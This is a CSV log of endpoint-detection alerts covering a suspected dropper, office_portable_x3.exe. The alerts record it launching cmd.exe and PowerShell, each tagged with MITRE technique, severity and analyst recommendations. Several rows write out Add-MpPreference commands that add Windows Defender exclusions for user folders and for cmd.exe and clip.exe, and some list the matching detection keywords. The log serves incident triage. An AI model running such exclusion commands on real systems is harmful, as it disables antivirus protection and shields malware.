Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:23:10.601",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: cmd.exe | C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL' ; Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-C61B50CB
"Jun 1, 2026 @ 14:23:11.974",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-BB2B2507
"Jun 1, 2026 @ 14:22:57.532",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"9,916",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-AD387BE2
"Jun 1, 2026 @ 14:22:58.852",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"22,348",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-2DDDC521
"Jun 1, 2026 @ 14:23:04.642",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"12,756",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-04C7009A
"Jun 1, 2026 @ 14:23:13.210",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-B7B39EC2
"Jun 1, 2026 @ 14:23:05.070",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"30,312",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-DB2DFE4D
"Jun 1, 2026 @ 14:23:15.461",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-D80CD8E9
"Jun 1, 2026 @ 14:23:15.481",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"19,284",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-9D807396
"Jun 1, 2026 @ 14:23:15.485",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"26,804",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-CA275B1E
